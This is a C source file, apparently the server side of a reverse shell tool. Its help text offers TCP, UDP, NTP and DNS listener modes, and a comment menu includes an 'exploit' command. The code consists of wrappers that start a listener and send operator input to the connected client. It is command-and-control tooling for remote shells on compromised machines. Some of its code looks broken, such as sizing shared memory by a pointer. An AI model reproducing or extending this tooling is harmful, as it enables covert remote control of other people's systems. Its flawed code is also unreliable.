/* ------ HELP ------- */
/*
			NAME
						main - server - client reverse shell programm

			SYNOPSIS
						./main [OPTIONS]
			DESCRIPTION

				It is a server help. To execute programm with different server connections see the required options below.

				--tcp           ----->          create server with tcp connection
				--udp           ----->          create server with udp connection
				--ntp           ----->          create server with ntp connection
				--dns           ----->          create server with dns connection
				--help          ----->          show this help
*/

/* 
shell.c:

static struct menu *menu_objs;

shell_help() {
	int i = 0;
	while(menu_objs[i])
		print(menu_objs.help)
}

int reg_menu(struct menu *menu_ptr, int menu_size) {
	copy from server_menus_objs ---> menu_objs;
	//last elem {NULL, NULL, NULL, NULL, 0, 0, 0}
	// use realoc for menu_objs
}


main() {
	reg_menu(server_menus_objs, size(server_menus_objs) / size(menu));
}

struct menu server_menus_objs[SHELL_CMD_NUM] = {
	//+flag bg or fg
	{"exit", EXIT_HELP, shell_exit, NULL, EXIT_ID, 0, FG},
	{"start_server", START_SERVER_HELP, server_connect, NULL, START_SERVER_ID, 1, BG},
	{"help", SHELL_HELP, shell_help, NULL, HELP_ID, 0, FG},
	{"server_disconect", SERVER_DISCONNECT_HELP, server_disconnect, NULL, DISCONNECT_ID, 0, FG},
	{"clear", CLEAR_HELP, shell_clear, NULL, CLEAR_ID, 0, FG},
	{"exploit", EXPLOIT_HELP, server_exploit, NULL, EXPLOIT_ID, 1, FG},
	{NULL, NULL, NULL, NULL, 0, 0, 0}
};
*/

#include <stdlib.h>
#include <stdio.h>
#include "Server.h"

int server_exploit(struct menu *input)
{
	if (server_object->server_write(input) != SUCCESS) {
		return ERR_EXPLOIT;
	}

	return SUCCESS;
}

int server_read()
{
	if (server_object->server_read() != SUCCESS) {
		return ERR_READ;
	}

	return SUCCESS;
}

//return
int server_connect(struct menu *input)
{
	int port = atoi(input->args[0]);

	if (server_object->server_init(port) != SUCCESS) {
		return ERR_INIT;
	}

	return SUCCESS;
}

//return
int server_disconnect(struct menu *input)
{
	if (server_object->server_disconnect() != SUCCESS) {
		return ERR_DISCONNECT;
	}

	return SUCCESS;
}

int server_register(int type)
{
	server_object = create_shared_memory(sizeof(server_object));
	if (type == TCP) {
		memcpy(server_object, &tcp_obj, sizeof(tcp_obj));
	}
	else if (type == UDP) {
		memcpy(server_object, &udp_obj, sizeof(udp_obj));
	} 
	server_object = (struct server*)server_object;

	return SUCCESS;
}